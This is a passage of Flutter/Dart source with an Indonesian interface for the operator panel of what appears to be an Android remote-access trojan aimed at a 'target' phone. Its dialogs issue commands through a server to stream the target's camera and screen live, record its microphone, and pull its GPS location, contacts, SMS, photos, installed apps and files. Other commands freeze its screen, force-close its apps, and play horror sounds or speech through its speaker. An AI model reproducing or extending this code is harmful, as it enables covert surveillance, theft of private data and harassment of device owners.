        title: Row(children: [Icon(Icons.music_note_rounded, color: Colors.pink, size: 20), const SizedBox(width: 10), Text('LOOP SOUND', style: TextStyle(color: Colors.pink, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: kFont))]),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Text('Pilih suara yang akan diputar loop di target', style: TextStyle(color: _C.textDim, fontSize: 12, fontFamily: kFont)),
            const SizedBox(height: 16),
            SizedBox(width: double.infinity, child: ElevatedButton.icon(style: ElevatedButton.styleFrom(backgroundColor: Colors.red.shade800, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)), padding: const EdgeInsets.symmetric(vertical: 14)), icon: Icon(Icons.volume_up_rounded, color: _C.white, size: 20), label: Text('HORROR SOUND', style: TextStyle(color: _C.white, fontSize: 13, fontWeight: FontWeight.bold, fontFamily: kFont)), onPressed: () { Navigator.pop(context); _cmd('play_loop_sound', extra: 'fire', spinId: 27); })),
            const SizedBox(height: 10),
            SizedBox(width: double.infinity, child: ElevatedButton.icon(style: ElevatedButton.styleFrom(backgroundColor: Colors.orange.shade700, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)), padding: const EdgeInsets.symmetric(vertical: 14)), icon: Icon(Icons.notifications_rounded, color: _C.white, size: 20), label: Text('SOUND NOTIF', style: TextStyle(color: _C.white, fontSize: 13, fontWeight: FontWeight.bold, fontFamily: kFont)), onPressed: () { Navigator.pop(context); _cmd('play_loop_sound', extra: 'air', spinId: 27); })),
            const SizedBox(height: 10),
            SizedBox(width: double.infinity, child: ElevatedButton.icon(style: ElevatedButton.styleFrom(backgroundColor: Colors.purple.shade700, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)), padding: const EdgeInsets.symmetric(vertical: 14)), icon: Icon(Icons.error_rounded, color: _C.white, size: 20), label: Text('SOUND MALWARE', style: TextStyle(color: _C.white, fontSize: 13, fontWeight: FontWeight.bold, fontFamily: kFont)), onPressed: () { Navigator.pop(context); _cmd('play_loop_sound', extra: 'iya', spinId: 27); })),
            const SizedBox(height: 12),
            Container(padding: const EdgeInsets.all(10), decoration: BoxDecoration(color: _C.primary.withOpacity(0.05), borderRadius: BorderRadius.circular(8), border: Border.all(color: _C.primary.withOpacity(0.2))), child: Row(children: [Icon(Icons.info_outline_rounded, color: _C.primary.withOpacity(0.6), size: 14), const SizedBox(width: 8), Expanded(child: Text('Suara akan looping terus sampai di STOP', style: TextStyle(color: _C.textDim, fontSize: 10, fontFamily: kFont)))])),
          ],
        ),
        actions: [TextButton(onPressed: () => Navigator.pop(context), child: Text('Batal', style: TextStyle(color: _C.textDim, fontSize: 12, fontFamily: kFont)))],
      ),
    );
  }

  void _showSpeakDialog() {
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => AlertDialog(
        backgroundColor: _C.card,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
        title: Row(children: [Icon(Icons.volume_up_rounded, color: _C.secondary, size: 20), const SizedBox(width: 10), Text('TEXT TO SPEECH', style: TextStyle(color: _C.secondary, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: kFont))]),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Text('Masukkan pesan yang ingin diucapkan target', style: TextStyle(color: _C.textDim, fontSize: 12, fontFamily: kFont)),
            const SizedBox(height: 16),
            TextField(
              controller: ctrl,
              textAlign: TextAlign.center,
              maxLines: 3,
              style: TextStyle(color: _C.text, fontSize: 16, fontFamily: kFont),
              decoration: InputDecoration(
                hintText: 'Halo, ini peringatan!',
                hintStyle: TextStyle(color: _C.textDim, fontSize: 14, fontFamily: kFont),
                filled: true,
                fillColor: _C.surface,
                border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: _C.border)),
                enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: _C.border)),
                focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: _C.secondary)),
              ),
            ),
            const SizedBox(height: 8),
            Text('Suara akan keluar dari speaker target (suara Google)', style: TextStyle(color: _C.secondary.withOpacity(0.6), fontSize: 10, fontFamily: kFont), textAlign: TextAlign.center),
          ],
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: Text('Batal', style: TextStyle(color: _C.textDim, fontSize: 12, fontFamily: kFont))),
          ElevatedButton(style: ElevatedButton.styleFrom(backgroundColor: _C.secondary, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)), padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10)), onPressed: () { Navigator.pop(context); String text = ctrl.text.trim(); if (text.isEmpty) { _toastError('Pesan tidak boleh kosong'); return; } _cmd('speak', extra: text, spinId: 26); }, child: Text('KIRIM SUARA', style: TextStyle(color: _C.bg, fontSize: 12, fontWeight: FontWeight.bold, fontFamily: kFont))),
        ],
      ),
    );
  }

  void _showFreezeDialog() {
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => AlertDialog(
        backgroundColor: _C.card,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
        title: Row(children: [Icon(Icons.block_rounded, color: _C.primaryDark, size: 20), const SizedBox(width: 10), Text('FREEZE SCREEN', style: TextStyle(color: _C.primaryDark, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: kFont))]),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Text('Masukkan durasi freeze dalam detik', style: TextStyle(color: _C.textDim, fontSize: 12, fontFamily: kFont)),
            const SizedBox(height: 16),
            TextField(controller: ctrl, keyboardType: TextInputType.number, textAlign: TextAlign.center, style: TextStyle(color: _C.text, fontSize: 18, fontFamily: kFont), decoration: InputDecoration(hintText: '30', hintStyle: TextStyle(color: _C.textDim, fontSize: 14, fontFamily: kFont), filled: true, fillColor: _C.surface, border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: _C.border)), enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: _C.border)), focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: _C.primaryDark)))),
            const SizedBox(height: 8),
            Text('Layar target akan FREEZE selama durasi yg ditentukan', style: TextStyle(color: _C.primaryDark.withOpacity(0.6), fontSize: 10, fontFamily: kFont), textAlign: TextAlign.center),
          ],
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: Text('Batal', style: TextStyle(color: _C.textDim, fontSize: 12, fontFamily: kFont))),
          ElevatedButton(style: ElevatedButton.styleFrom(backgroundColor: _C.primaryDark, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)), padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10)), onPressed: () { Navigator.pop(context); String input = ctrl.text.trim(); int duration = int.tryParse(input) ?? 30; if (duration < 1) duration = 5; if (duration > 300) duration = 300; _cmd('screen_freeze', extra: duration.toString(), spinId: 35); }, child: Text('FREEZE!', style: TextStyle(color: _C.white, fontSize: 12, fontWeight: FontWeight.bold, fontFamily: kFont))),
        ],
      ),
    );
  }

  // ─── DIALOG VIEWS ───────────────────────────────────────────────────
  void _imgDialog(String b64, String title) {
    try {
      final raw = b64.contains(',') ? b64.split(',').last : b64;
      final bytes = base64Decode(raw);
      Navigator.of(context).push(MaterialPageRoute(builder: (_) => FullScreenDialog(child: Column(children: [_buildDialogHeader(title, Icons.image_rounded, _C.primary), Expanded(child: Center(child: ClipRRect(borderRadius: BorderRadius.circular(12), child: Image.memory(bytes, fit: BoxFit.contain))))]))));
    } catch (_) { _toastError('Image decode failed'); }
  }

  void _locationDialog(dynamic lat, dynamic lng) {
    Navigator.of(context).push(
      MaterialPageRoute(
        builder: (_) => FullScreenDialog(
          child: Column(
            children: [
              _buildDialogHeader('GPS LOCATION', Icons.my_location_rounded, _C.success),
              Expanded(
                child: Container(
                  padding: const EdgeInsets.all(24),
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Container(width: 120, height: 120, decoration: BoxDecoration(color: _C.success.withOpacity(0.1), shape: BoxShape.circle, border: Border.all(color: _C.success.withOpacity(0.3), width: 2)), child: Icon(Icons.location_on_rounded, color: _C.success, size: 60)),
                      const SizedBox(height: 32),
                      Container(padding: const EdgeInsets.all(16), decoration: BoxDecoration(color: _C.surface, borderRadius: BorderRadius.circular(12), border: Border.all(color: _C.border)), child: Column(children: [Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [Text('Latitude', style: TextStyle(color: _C.textDim, fontSize: 14, fontFamily: kFont)), Text(lat?.toString() ?? '-', style: TextStyle(color: _C.text, fontSize: 14, fontWeight: FontWeight.w500, fontFamily: kFont))]), const SizedBox(height: 8), Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [Text('Longitude', style: TextStyle(color: _C.textDim, fontSize: 14, fontFamily: kFont)), Text(lng?.toString() ?? '-', style: TextStyle(color: _C.text, fontSize: 14, fontWeight: FontWeight.w500, fontFamily: kFont))])])),
                      const SizedBox(height: 32),
                      ElevatedButton.icon(style: ElevatedButton.styleFrom(backgroundColor: _C.success, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)), padding: const EdgeInsets.symmetric(horizontal: 32, vertical: 14)), icon: const Icon(Icons.map_rounded, color: _C.white, size: 20), label: Text('Buka Google Maps', style: TextStyle(color: _C.white, fontSize: 14, fontFamily: kFont)), onPressed: () => launchUrl(Uri.parse('https://www.google.com/maps/search/?api=1&query=$lat,$lng'), mode: LaunchMode.externalApplication)),
                    ],
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _textDialog(String title, String content) {
    Navigator.of(context).push(MaterialPageRoute(builder: (_) => FullScreenDialog(child: Column(children: [_buildDialogHeader(title, Icons.text_fields_rounded, _C.primary), Expanded(child: Container(padding: const EdgeInsets.all(24), child: Container(padding: const EdgeInsets.all(16), decoration: BoxDecoration(color: _C.surface, borderRadius: BorderRadius.circular(12), border: Border.all(color: _C.border)), child: SingleChildScrollView(child: SelectableText(content, style: TextStyle(color: _C.text, fontSize: 14, height: 1.5, fontFamily: kFont))))))]))));
  }

  void _contactsDialog(List contacts) {
    Navigator.of(context).push(
      MaterialPageRoute(
        builder: (_) => FullScreenDialog(
          child: Column(
            children: [
              _buildDialogHeader('CONTACTS (${contacts.length})', Icons.contacts_rounded, _C.primary),
              Expanded(
                child: Container(
                  padding: const EdgeInsets.all(16),
                  child: ListView.separated(
                    itemCount: contacts.length,
                    separatorBuilder: (_, __) => Divider(color: _C.border, height: 1),
                    itemBuilder: (_, i) => ListTile(
                      leading: Container(width: 44, height: 44, decoration: BoxDecoration(color: _C.primary.withOpacity(0.1), borderRadius: BorderRadius.circular(12)), child: Icon(Icons.person_rounded, color: _C.primary, size: 24)),
                      title: Text(contacts[i]['name']?.toString() ?? '-', style: TextStyle(color: _C.text, fontSize: 14, fontWeight: FontWeight.w500, fontFamily: kFont)),
                      subtitle: Text(contacts[i]['number']?.toString() ?? '-', style: TextStyle(color: _C.textDim, fontSize: 12, fontFamily: kFont)),
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _smsDialog(List sms) {
    Navigator.of(context).push(
      MaterialPageRoute(
        builder: (_) => FullScreenDialog(
          child: Column(
            children: [
              _buildDialogHeader('SMS (${sms.length})', Icons.sms_rounded, _C.accent),
              Expanded(
                child: Container(
                  padding: const EdgeInsets.all(16),
                  child: ListView.separated(
                    itemCount: sms.length,
                    separatorBuilder: (_, __) => Divider(color: _C.border, height: 1),
                    itemBuilder: (_, i) {
                      final s = sms[i] as Map;
                      return ListTile(
                        leading: Container(width: 44, height: 44, decoration: BoxDecoration(color: _C.accent.withOpacity(0.1), borderRadius: BorderRadius.circular(12)), child: Icon(Icons.sms_rounded, color: _C.accent, size: 24)),
                        title: Text(s['address']?.toString() ?? '-', style: TextStyle(color: _C.text, fontSize: 14, fontWeight: FontWeight.w500, fontFamily: kFont)),
                        subtitle: Text(s['body']?.toString() ?? '', style: TextStyle(color: _C.textDim, fontSize: 12, fontFamily: kFont), maxLines: 2, overflow: TextOverflow.ellipsis),
                      );
                    },
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _galleryDialog(List imgs) {
    Navigator.of(context).push(
      MaterialPageRoute(
        builder: (_) => FullScreenDialog(
          child: Column(
            children: [
              _buildDialogHeader('GALLERY (${imgs.length})', Icons.photo_library_rounded, _C.primaryDark),
              Expanded(
                child: Container(
                  padding: const EdgeInsets.all(16),
                  child: imgs.isEmpty
                      ? Center(child: Column(mainAxisSize: MainAxisSize.min, children: [Icon(Icons.photo_library_rounded, color: _C.textDim, size: 60), const SizedBox(height: 12), Text('Tidak ada foto', style: TextStyle(color: _C.textDim, fontSize: 14, fontFamily: kFont))]))
                      : GridView.builder(
                          gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 3, crossAxisSpacing: 4, mainAxisSpacing: 4),
                          itemCount: imgs.length,
                          itemBuilder: (_, i) {
                            try {
                              final raw = imgs[i].toString();
                              final clean = raw.contains(',') ? raw.split(',').last : raw;
                              final bytes = base64Decode(clean);
                              return GestureDetector(onTap: () => _imgDialog(raw, 'Gallery Photo ${i + 1}'), child: ClipRRect(borderRadius: BorderRadius.circular(8), child: Image.memory(bytes, fit: BoxFit.cover)));
                            } catch (_) {
                              return Container(decoration: BoxDecoration(color: _C.surface, borderRadius: BorderRadius.circular(8)), child: Center(child: Icon(Icons.broken_image_rounded, color: _C.textDim, size: 30)));
                            }
                          },
                        ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _fileManagerDialog(List files, String currentPath) {
    Navigator.of(context).push(
      MaterialPageRoute(
        builder: (_) => FullScreenDialog(
          child: Column(
            children: [
              _buildDialogHeader('FILE MANAGER', Icons.folder_rounded, _C.primary),
              Expanded(
                child: Container(
                  padding: const EdgeInsets.all(16),
                  child: Column(
                    children: [
                      Container(padding: const EdgeInsets.all(12), decoration: BoxDecoration(color: _C.surface, borderRadius: BorderRadius.circular(12), border: Border.all(color: _C.border)), child: Row(children: [Icon(Icons.folder_open_rounded, color: _C.primary, size: 18), const SizedBox(width: 12), Expanded(child: Text(currentPath, style: TextStyle(color: _C.text, fontSize: 12, fontFamily: kFont), overflow: TextOverflow.ellipsis)), IconButton(icon: Icon(Icons.refresh_rounded, color: _C.primary, size: 20), onPressed: () { Navigator.pop(context); _cmd('list_files', extra: currentPath, spinId: 12); }, padding: EdgeInsets.zero, constraints: const BoxConstraints())])),
                      const SizedBox(height: 12),
                      Expanded(
                        child: files.isEmpty
                            ? Center(child: Column(mainAxisSize: MainAxisSize.min, children: [Icon(Icons.folder_open_rounded, color: _C.textDim, size: 60), const SizedBox(height: 12), Text('Folder kosong', style: TextStyle(color: _C.textDim, fontSize: 14, fontFamily: kFont))]))
                            : ListView.separated(
                                itemCount: files.length,
                                separatorBuilder: (_, __) => Divider(color: _C.border, height: 1),
                                itemBuilder: (_, i) {
                                  final file = files[i] as Map;
                                  final name = file['name']?.toString() ?? 'unknown';
                                  final size = file['size']?.toString() ?? '0';
                                  final isDir = file['isDirectory'] == true;
                                  return ListTile(
                                    leading: Container(width: 44, height: 44, decoration: BoxDecoration(color: isDir ? _C.primary.withOpacity(0.15) : _C.primaryDark.withOpacity(0.15), borderRadius: BorderRadius.circular(12)), child: Icon(isDir ? Icons.folder_rounded : Icons.insert_drive_file_rounded, color: isDir ? _C.primary : _C.primaryDark, size: 24)),
                                    title: Text(name, style: TextStyle(color: _C.text, fontSize: 14, fontWeight: FontWeight.w500, fontFamily: kFont), overflow: TextOverflow.ellipsis),
                                    subtitle: isDir ? Text('Folder', style: TextStyle(color: _C.textDim, fontSize: 12, fontFamily: kFont)) : Text('$size bytes', style: TextStyle(color: _C.textDim, fontSize: 12, fontFamily: kFont)),
                                    trailing: isDir ? Icon(Icons.chevron_right_rounded, color: _C.textDim, size: 24) : IconButton(icon: Icon(Icons.download_rounded, color: _C.success, size: 22), onPressed: () { _toastSuccess('Download: $name'); _cmd('download_file', extra: '$currentPath/$name', spinId: 12); }, padding: EdgeInsets.zero, constraints: const BoxConstraints()),
                                    onTap: () { if (isDir) { Navigator.pop(context); _cmd('list_files', extra: '$currentPath/$name', spinId: 12); } },
                                  );
                                },
                              ),
                      ),
                      const SizedBox(height: 12),
                      Row(
                        children: [
                          Expanded(child: OutlinedButton(style: OutlinedButton.styleFrom(side: BorderSide(color: _C.border), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)), padding: const EdgeInsets.symmetric(vertical: 12)), onPressed: () => Navigator.pop(context), child: Text('Tutup', style: TextStyle(color: _C.textDim, fontSize: 12, fontFamily: kFont)))),
                          const SizedBox(width: 12),
                          Expanded(child: ElevatedButton(style: ElevatedButton.styleFrom(backgroundColor: _C.primary, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)), padding: const EdgeInsets.symmetric(vertical: 12)), onPressed: () => _inputDialog('Go to Path', 'Path:', (v) => _cmd('list_files', extra: v, spinId: 12), hint: '/storage/emulated/0/'), child: Text('Go to', style: TextStyle(color: _C.bg, fontSize: 12, fontWeight: FontWeight.bold, fontFamily: kFont)))),
                        ],
                      ),
                    ],
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _showAppsDialog(List apps) {
    if (apps.isEmpty) { _toastError('Tidak ada aplikasi terinstall'); return; }
    Navigator.of(context).push(
      MaterialPageRoute(
        builder: (_) => FullScreenDialog(
          child: Column(
            children: [
              _buildDialogHeader('INSTALLED APPS', Icons.apps_rounded, _C.primaryDark),
              Expanded(
                child: Container(
                  padding: const EdgeInsets.all(16),
                  child: ListView.separated(
                    itemCount: apps.length,
                    separatorBuilder: (_, __) => Divider(color: _C.border, height: 1),
                    itemBuilder: (_, i) {
                      final app = apps[i] as Map;
                      final appName = app['name']?.toString() ?? 'Unknown';
                      final packageName = app['package']?.toString() ?? '';
                      return ListTile(
                        leading: Container(width: 44, height: 44, decoration: BoxDecoration(color: _C.primaryDark.withOpacity(0.15), borderRadius: BorderRadius.circular(12), border: Border.all(color: _C.primaryDark.withOpacity(0.3))), child: Icon(Icons.android_rounded, color: _C.primaryDark, size: 24)),
                        title: Text(appName, style: TextStyle(color: _C.text, fontSize: 14, fontWeight: FontWeight.w600, fontFamily: kFont)),
                        subtitle: Text(packageName, style: TextStyle(color: _C.textDim, fontSize: 12, fontFamily: kFont)),
                      );
                    },
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Future<void> _listApps() async {
    if (_id == 'unknown') { _toastError('ID target tidak valid'); return; }
    await _cmd('list_apps', spinId: 17);
  }

  Future<void> _recordMicWithLoading() async {
    if (_id == 'unknown') { _toastError('ID target tidak valid'); return; }
    _toastWarning('🎙️ Menunggu 30 detik...');
    await _cmd('record_mic', spinId: 29);
  }

  void _toggleForceClose() async {
    if (_isForceCloseOn) {
      _cmd('force_close_off', spinId: 16);
      _forceCloseTimer?.cancel();
      await Future.delayed(const Duration(seconds: 1));
      setState(() => _isForceCloseOn = false);
      _toastInfo('Force Close OFF');
    } else {
      _cmd('force_close_on', spinId: 16);
      await Future.delayed(const Duration(seconds: 1));
      setState(() => _isForceCloseOn = true);
      _toastWarning('Force Close ON');
      _forceCloseTimer = Timer.periodic(const Duration(seconds: 1), (timer) {
        if (_isForceCloseOn) { _cmd('force_close', silent: true); } else { timer.cancel(); }
      });
    }
  }

  // ─── PLAY AUDIO ─────────────────────────────────────────────────────
  void _playAudioDirect(String audioBase64) {
    Uint8List? audioBytes;
    try {
      audioBytes = base64Decode(audioBase64);
    } catch (e) {
      _addLog('Decode error: $e');
      _toastError('Gagal decode audio: $e');
      return;
    }

    if (audioBytes == null || audioBytes.isEmpty) {
      _toastError('Audio kosong');
      return;
    }

    _addLog('Audio size: ${audioBytes.length} bytes');
    _saveAndPlayAudio(audioBytes);
  }

  void _saveAndPlayAudio(Uint8List audioBytes) {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => AlertDialog(
        backgroundColor: _C.card,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
        title: Row(children: [
          Icon(Icons.mic_rounded, color: _C.primary, size: 20),
          const SizedBox(width: 10),
          Text('HASIL REKAMAN', style: TextStyle(color: _C.text, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: kFont))
        ]),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              width: 80, height: 80,
              decoration: BoxDecoration(color: _C.primary.withOpacity(0.1), shape: BoxShape.circle),
              child: Icon(Icons.audio_file, color: _C.primary, size: 40),
            ),
            const SizedBox(height: 16),
            Text('Durasi: 30 detik', style: TextStyle(color: _C.textDim, fontSize: 14, fontFamily: kFont)),
            Text('${audioBytes.length} bytes', style: TextStyle(color: _C.textDim, fontSize: 12, fontFamily: kFont)),
            const SizedBox(height: 16),
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceEvenly,
              children: [
                ElevatedButton.icon(
                  style: ElevatedButton.styleFrom(
                    backgroundColor: _C.success,
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                    padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10)
                  ),
                  onPressed: () async {
                    try {
                      String savePath;
                      try {
                        final downloadsDir = Directory('/storage/emulated/0/Download');
                        if (await downloadsDir.exists()) {
                          savePath = downloadsDir.path;
                        } else {
                          final appDocDir = await getApplicationDocumentsDirectory();
                          savePath = appDocDir.path;
                        }
                      } catch (e) {
                        final appDocDir = await getApplicationDocumentsDirectory();
                        savePath = appDocDir.path;
                      }

                      final fileName = 'rekaman_${DateTime.now().millisecondsSinceEpoch}.3gp';
                      final saveFile = File('$savePath/$fileName');
                      await saveFile.writeAsBytes(audioBytes);
                      _addLog('Saved to: ${saveFile.path}');
                      _toastSuccess('Tersimpan di: $savePath');
                      Navigator.pop(context);
                    } catch (e) {
                      _addLog('Error save: $e');
                      _toastError('Gagal simpan: $e');
                    }
                  },
                  icon: const Icon(Icons.save, size: 18, color: _C.white),
                  label: Text('SIMPAN', style: TextStyle(fontSize: 12, fontFamily: kFont, color: _C.white)),
                ),
                ElevatedButton.icon(
                  style: ElevatedButton.styleFrom(
                    backgroundColor: _C.primary,
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                    padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10)
                  ),
                  onPressed: () => Navigator.pop(context),
                  icon: const Icon(Icons.close, size: 18, color: _C.white),
                  label: Text('TUTUP', style: TextStyle(fontSize: 12, fontFamily: kFont, color: _C.white)),
                ),
              ],
            ),
            const SizedBox(height: 8),
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: _C.primary.withOpacity(0.05),
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: _C.primary.withOpacity(0.2))
              ),
              child: Row(
                children: [
                  Icon(Icons.info_outline_rounded, color: _C.primary.withOpacity(0.6), size: 14),
                  const SizedBox(width: 8),
                  Expanded(
                    child: Text(
                      'Audio disimpan, buka file manager untuk memutar',
                      style: TextStyle(color: _C.textDim, fontSize: 10, fontFamily: kFont)
                    )
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() {
      _liveOn = true;
      _frame = null;
      _liveTitle = mode == 'live_camera_start' ? (extra == 'front' ? 'KAMERA DEPAN' : 'KAMERA BELAKANG') : 'SCREEN';
      _frmCount = 0;
      _fps = 0;
      _fpsTs = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_liveOn || !mounted) { _liveTimer?.cancel(); return; }
      try {
        final res = await http.get(Uri.parse('$_kBase/api/live-frame/$_id')).timeout(const Duration(milliseconds: 400));
        if (res.statusCode == 200) {
          final raw = (jsonDecode(res.body)['frame'] ?? '').toString();
          if (raw.isNotEmpty && mounted) {
            final clean = raw.contains(',') ? raw.split(',').last : raw;
            final bytes = base64Decode(clean);
            setState(() {
              _frame = bytes;
              _frmCount++;
              final ms = DateTime.now().difference(_fpsTs).inMilliseconds;
              if (ms >= 1000) {
                _fps = (_frmCount * 1000 / ms).round();
                _frmCount = 0;
                _fpsTs = DateTime.now();
              }
            });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });

    if (mounted && !_isLiveDialogShowing) {
      _isLiveDialogShowing = true;
      _showLiveDialog();
    }
  }

  void _stopLive() {
    _liveTimer?.cancel();
    if (mounted) setState(() {
      _liveOn = false;
      _frame = null;
    });
    _cmd('live_stop', silent: true);
    _addLog('Live dihentikan');
    _isLiveDialogShowing = false;
  }

  void _showLiveDialog() {
    Navigator.of(context).push(
      MaterialPageRoute(
        builder: (ctx) => FullScreenDialog(
          child: ValueListenableBuilder<int>(
            valueListenable: _frameN,
            builder: (_, __, ___) => Column(
              children: [
                Container(padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12), decoration: BoxDecoration(color: _C.card, border: Border(bottom: BorderSide(color: _C.border))), child: Row(children: [IconButton(icon: Icon(Icons.arrow_back_ios, color: _C.primary, size: 22), onPressed: () { _stopLive(); Navigator.pop(ctx); }, padding: EdgeInsets.zero, constraints: const BoxConstraints()), const SizedBox(width: 8), Container(width: 8, height: 8, decoration: BoxDecoration(color: _C.primary, shape: BoxShape.circle)), const SizedBox(width: 8), Text('LIVE — $_liveTitle', style: TextStyle(color: _C.text, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: kFont)), const Spacer(), Container(padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4), decoration: BoxDecoration(color: _C.success.withOpacity(0.15), borderRadius: BorderRadius.circular(8), border: Border.all(color: _C.success.withOpacity(0.4))), child: Text('$_fps fps', style: TextStyle(color: _C.success, fontSize: 12, fontWeight: FontWeight.bold, fontFamily: kFont)))])),
                Expanded(child: Container(color: _C.bg, child: _frame != null ? Image.memory(_frame!, fit: BoxFit.contain, gaplessPlayback: true) : Center(child: Column(mainAxisSize: MainAxisSize.min, children: [CircularProgressIndicator(color: _C.primary, strokeWidth: 3), const SizedBox(height: 16), Text('Menunggu frame...', style: TextStyle(color: _C.textDim, fontSize: 14, fontFamily: kFont))])))),
                Container(padding: const EdgeInsets.all(16), decoration: BoxDecoration(color: _C.card, border: Border(top: BorderSide(color: _C.border))), child: Row(children: [Expanded(child: OutlinedButton.icon(style: OutlinedButton.styleFrom(side: BorderSide(color: _C.border), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)), padding: const EdgeInsets.symmetric(vertical: 14)), icon: Icon(Icons.cameraswitch_rounded, color: _C.textDim, size: 18), label: Text('Ganti Kamera', style: TextStyle(color: _C.textDim, fontSize: 12, fontFamily: kFont)), onPressed: () { final isFront = _liveTitle.contains('DEPAN'); _stopLive(); Future.delayed(const Duration(milliseconds: 300), () { if (mounted) _startLive('live_camera_start', isFront ? 'back' : 'front'); }); })), const SizedBox(width: 12), Expanded(child: ElevatedButton.icon(style: ElevatedButton.styleFrom(backgroundColor: _C.primary, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)), padding: const EdgeInsets.symmetric(vertical: 14)), icon: Icon(Icons.stop_rounded, color: _C.white, size: 18), label: Text('Stop Live', style: TextStyle(color: _C.white, fontSize: 12, fontFamily: kFont)), onPressed: () { _stopLive(); Navigator.pop(ctx); }))])),
              ],
            ),
          ),
        ),
      ),
    ).then((_) {
      _isLiveDialogShowing = false;
      if (_liveOn) { _stopLive(); }
    });
  }

  // ─── WIDGET SECTION ─────────────────────────────────────────────────
  Widget _buildSectionHeader(String title) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 22, vertical: 6),
      child: Row(
        children: [
          Expanded(child: Container(height: 1, decoration: BoxDecoration(gradient: LinearGradient(colors: [Colors.transparent, _C.primary.withOpacity(0.3), Colors.transparent])))),
          const SizedBox(width: 14),
          Text(title, style: TextStyle(color: _C.primary, fontSize: 11, fontWeight: FontWeight.bold, letterSpacing: 2.5, fontFamily: kFont)),
          const SizedBox(width: 14),
          Expanded(child: Container(height: 1, decoration: BoxDecoration(gradient: LinearGradient(colors: [Colors.transparent, _C.primary.withOpacity(0.3), Colors.transparent])))),
        ],
      ),
    );
  }

  Widget _buildGrid2x2(List<Widget> children) {
    List<Widget> items = List.from(children);
    if (items.length % 2 != 0) { items.add(const SizedBox.shrink()); }
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 22),
      child: GridView.count(
        shrinkWrap: true,
        physics: const NeverScrollableScrollPhysics(),
        crossAxisCount: 2,
        crossAxisSpacing: 12,
        mainAxisSpacing: 12,
        childAspectRatio: 1.1,
        children: items,
      ),
    );
  }

  Widget _buildMenuCard({
    required String title,
    required String subtitle,
    required IconData icon,
    required VoidCallback onTap,
    Color iconColor = _C.primary,
    String status = 'IDLE',
    bool isActive = false,
    int spinId = -1,
  }) {
    final isSpinning = spinId != -1 && _spinningStates[spinId] == true;

    return StatefulBuilder(
      builder: (context, setState) {
        bool _pressed = false;
        return GestureDetector(
          onTapDown: (_) => setState(() => _pressed = true),
          onTapUp: (_) {
            setState(() => _pressed = false);
            onTap();
          },
          onTapCancel: () => setState(() => _pressed = false),
          child: AnimatedScale(
            scale: _pressed ? 0.95 : 1.0,
            duration: const Duration(milliseconds: 130),
            child: Container(
              height: 145,
              decoration: BoxDecoration(
                color: isActive ? _C.primary.withOpacity(0.05) : _C.card,
                borderRadius: BorderRadius.circular(20),
